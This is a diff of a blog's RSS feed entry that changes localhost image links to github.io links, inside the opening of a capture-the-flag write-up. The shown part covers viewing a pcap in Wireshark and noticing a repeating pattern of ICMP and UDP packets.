+      <guid>https://connar.github.io/ctfwriteups/weaklegacy/</guid>
       <description>&lt;p&gt;Based on the description of the challenge, we need to decrypt some messages that seem to be encrypted.&lt;br&gt;
 Pcap files can be viewed by a software named Wireshark. Downloading both the challenge file and the software, we can finally view it:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/weaklegacy/weaklegacy1.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/weaklegacy/weaklegacy1.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;We can see a lot of ICMP packets and some UDP packets as well. More specifically, we can see that a pattern is created, where every 13-16 ICMP packets, two UDP packets are being exchanged.
 Moreover, all UDP packets contain only two hosts:&lt;/p&gt;</description>
